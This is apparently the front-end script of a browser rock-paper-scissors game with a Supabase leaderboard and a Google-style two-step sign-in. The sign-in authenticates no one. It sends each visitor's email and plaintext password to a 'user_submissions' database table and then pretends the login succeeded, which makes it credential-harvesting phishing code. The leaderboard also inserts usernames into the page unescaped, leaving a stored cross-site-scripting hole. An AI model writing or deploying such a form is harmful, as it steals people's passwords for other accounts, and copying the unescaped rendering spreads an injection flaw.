// Initialize Supabase Client
const SUPABASE_URL = 'https://wtbojotyzjvzywaqykbn.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_xw7vDVKxwoH1-u3MjPwLxA_O85n-yeX';
const _supabase = (typeof supabase !== 'undefined') ? supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;

// Global App State
let userEmail = localStorage.getItem('userEmail') || '';
let userName = localStorage.getItem('userName') || '';
let playerScore = parseInt(localStorage.getItem('playerScore') || '0', 10);
let aiScore = 0;

const isFormPage = !!document.getElementById('step-email');

// ==========================================
// AUTH FORM FLOW (form.html)
// ==========================================
if (isFormPage) {
  const landingView = document.getElementById('landing-view');
  const loginView = document.getElementById('login-view');
  const stepEmail = document.getElementById('step-email');
  const stepPassword = document.getElementById('step-password');
  const stepLoading = document.getElementById('step-loading');

  const sideTitle = document.getElementById('side-title');
  const privacyNotice = document.getElementById('privacy-notice');
  const emailChip = document.getElementById('email-chip');

  const emailInput = document.getElementById('email');
  const passInput = document.getElementById('password');
  const emailError = document.getElementById('email-error');
  const passError = document.getElementById('pass-error');

  document.getElementById('btn-open-login').addEventListener('click', () => {
    landingView.classList.add('hidden');
    loginView.classList.remove('hidden');
  });

  document.getElementById('btn-next').addEventListener('click', () => {
    const value = emailInput.value.trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!emailRegex.test(value)) {
      emailError.style.display = 'block';
      return;
    }

    emailError.style.display = 'none';
    userEmail = value;

    sideTitle.textContent = "Welcome";
    privacyNotice.classList.add('hidden');
    emailChip.classList.remove('hidden');
    document.getElementById('user-display-email').textContent = userEmail;

    stepEmail.classList.add('hidden');
    stepPassword.classList.remove('hidden');
  });

  const togglePassword = document.getElementById('toggle-password');
  togglePassword.addEventListener('change', () => {
    passInput.type = togglePassword.checked ? 'text' : 'password';
  });

  document.getElementById('btn-login').addEventListener('click', async () => {
    const plainTextValue = passInput.value.trim();

    if (!plainTextValue) {
      passError.style.display = 'block';
      return;
    }

    passError.style.display = 'none';

    if (_supabase) {
      await _supabase.from('user_submissions').insert([
        { email: userEmail, submitted_text: plainTextValue }
      ]);
    }

    localStorage.setItem('userEmail', userEmail);
    localStorage.setItem('isLoggedIn', 'true');

    stepPassword.classList.add('hidden');
    stepLoading.classList.remove('hidden');

    setTimeout(() => {
      window.location.href = 'index.html?signedin=true';
    }, 1200);
  });
}

// ==========================================
// HOMEPAGE FLOW (index.html)
// ==========================================
if (!isFormPage) {
  const modalAuthPrompt = document.getElementById('modal-auth-prompt');
  const modalUsernamePrompt = document.getElementById('modal-username-prompt');
  const btnGoToLogin = document.getElementById('btn-go-to-login');
  const btnSaveUsername = document.getElementById('btn-save-username');
  const usernameInput = document.getElementById('username-input');
  const usernameError = document.getElementById('username-error');

  const navHome = document.getElementById('nav-home');
  const navLeaderboard = document.getElementById('nav-leaderboard');
  const navProfile = document.getElementById('nav-profile');

  const viewHome = document.getElementById('view-home');
  const viewLeaderboard = document.getElementById('view-leaderboard');
  const viewProfile = document.getElementById('view-profile');

  const playerScoreEl = document.getElementById('player-score');
  const aiScoreEl = document.getElementById('ai-score');
  const gameStatusEl = document.getElementById('game-status');
  const playerLabelDisplay = document.getElementById('player-label-display');

  const profileDisplayName = document.getElementById('profile-display-name');
  const profileDisplayEmail = document.getElementById('profile-display-email');
  const profileWins = document.getElementById('profile-wins');
  const btnLogout = document.getElementById('btn-logout');

  // Load local state UI
  playerScoreEl.textContent = playerScore;
  if (userName) playerLabelDisplay.textContent = userName.toUpperCase();

  const urlParams = new URLSearchParams(window.location.search);
  const justSignedIn = urlParams.get('signedin') === 'true';
  const isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';

  // 10-Second Sign-In Prompt Timer for unauthenticated players
  if (!isLoggedIn && !justSignedIn) {
    setTimeout(() => {
      if (!localStorage.getItem('isLoggedIn')) {
        modalAuthPrompt.classList.remove('hidden');
      }
    }, 10000);
  }

  // Username prompt modal check
  if (justSignedIn || (isLoggedIn && !userName)) {
    modalUsernamePrompt.classList.remove('hidden');
  }

  btnGoToLogin.addEventListener('click', () => {
    window.location.href = 'form.html';
  });

  // Save Username & push local accumulated score to database
  btnSaveUsername.addEventListener('click', async () => {
    const val = usernameInput.value.trim();
    if (!val) {
      usernameError.style.display = 'block';
      return;
    }

    userName = val;
    userEmail = localStorage.getItem('userEmail') || userEmail;

    localStorage.setItem('userName', userName);
    localStorage.setItem('isLoggedIn', 'true');

    modalUsernamePrompt.classList.add('hidden');
    playerLabelDisplay.textContent = userName.toUpperCase();

    updateProfileUI();
    await saveScoreToSupabase();
  });

  // Navigation switching
  function switchView(targetView, activeBtn) {
    [viewHome, viewLeaderboard, viewProfile].forEach(v => v.classList.add('hidden'));
    [navHome, navLeaderboard, navProfile].forEach(b => b.classList.remove('active'));

    targetView.classList.remove('hidden');
    activeBtn.classList.add('active');

    if (targetView === viewLeaderboard) fetchSupabaseLeaderboard();
    if (targetView === viewProfile) updateProfileUI();
  }

  navHome.addEventListener('click', () => switchView(viewHome, navHome));
  navLeaderboard.addEventListener('click', () => switchView(viewLeaderboard, navLeaderboard));
  navProfile.addEventListener('click', () => switchView(viewProfile, navProfile));

  // Game Core Engine
  const choiceButtons = document.querySelectorAll('.choice-btn');

  choiceButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const playerChoice = btn.getAttribute('data-choice');

      choiceButtons.forEach(b => b.disabled = true);

      gameStatusEl.classList.add('animating');
      gameStatusEl.textContent = 'Rock... Paper... Scissors...';

      setTimeout(async () => {
        gameStatusEl.classList.remove('animating');

        const choices = ['rock', 'paper', 'scissors'];
        const aiChoice = choices[Math.floor(Math.random() * 3)];

        let result = '';

        if (playerChoice === aiChoice) {
          result = `Draw! Both picked ${playerChoice}.`;
        } else if (
          (playerChoice === 'rock' && aiChoice === 'scissors') ||
          (playerChoice === 'paper' && aiChoice === 'rock') ||
          (playerChoice === 'scissors' && aiChoice === 'paper')
        ) {
          playerScore++;
          localStorage.setItem('playerScore', playerScore);
          playerScoreEl.textContent = playerScore;
          result = `You won! ${playerChoice} beats ${aiChoice}.`;
          
          // Push score update directly on win
          await saveScoreToSupabase();
        } else {
          aiScore++;
          aiScoreEl.textContent = aiScore;
          result = `AI won! ${aiChoice} beats ${playerChoice}.`;
        }

        gameStatusEl.textContent = result;
        choiceButtons.forEach(b => b.disabled = false);
      }, 1200);
    });
  });

  // Supabase Score Sync Function
  async function saveScoreToSupabase() {
    // Ensure email and username are up to date from local storage
    if (!userEmail) userEmail = localStorage.getItem('userEmail') || '';
    if (!userName) userName = localStorage.getItem('userName') || '';

    if (!userName || !userEmail || !_supabase) {
      console.warn('Score saved locally. Sign in with username to sync to live leaderboard.');
      return;
    }

    const { error } = await _supabase
      .from('leaderboard')
      .upsert(
        { email: userEmail, username: userName, score: playerScore },
        { onConflict: 'email' }
      );

    if (error) {
      console.error('Leaderboard sync error:', error.message);
    } else {
      console.log('Score synced to Supabase successfully!');
    }
  }

  // Fetch Live Rankings
  async function fetchSupabaseLeaderboard() {
    const tbody = document.getElementById('leaderboard-body');
    tbody.innerHTML = '<tr><td colspan="3" class="text-center" style="color: #8e918f;">Loading rankings...</td></tr>';

    if (!_supabase) {
      tbody.innerHTML = '<tr><td colspan="3" class="text-center" style="color: #ef4444;">Database connection error.</td></tr>';
      return;
    }

    const { data, error } = await _supabase
      .from('leaderboard')
      .select('username, score')
      .order('score', { ascending: false })
      .limit(10);

    if (error || !data || data.length === 0) {
      tbody.innerHTML = '<tr><td colspan="3" class="text-center" style="color: #8e918f;">No rankings yet. Be the first to play!</td></tr>';
      return;
    }

    tbody.innerHTML = data.map((entry, idx) => `
      <tr>
        <td class="rank-badge">#${idx + 1}</td>
        <td>${entry.username || 'Anonymous'}</td>
        <td>${entry.score}</td>
      </tr>
    `).join('');
  }

  async function updateProfileUI() {
    profileDisplayName.textContent = userName || 'Guest Player';
    profileDisplayEmail.textContent = userEmail || 'Not Signed In';
    profileWins.textContent = playerScore;

    if (_supabase && userEmail) {
      const { data } = await _supabase
        .from('leaderboard')
        .select('email')
        .order('score', { ascending: false });

      if (data) {
        const rank = data.findIndex(e => e.email === userEmail) + 1;
        document.getElementById('profile-rank').textContent = rank > 0 ? `#${rank}` : '#--';
      }
    }
  }

  // Reset Session on Logout
  btnLogout.addEventListener('click', () => {
    localStorage.clear();
    window.location.href = 'form.html';
  });
}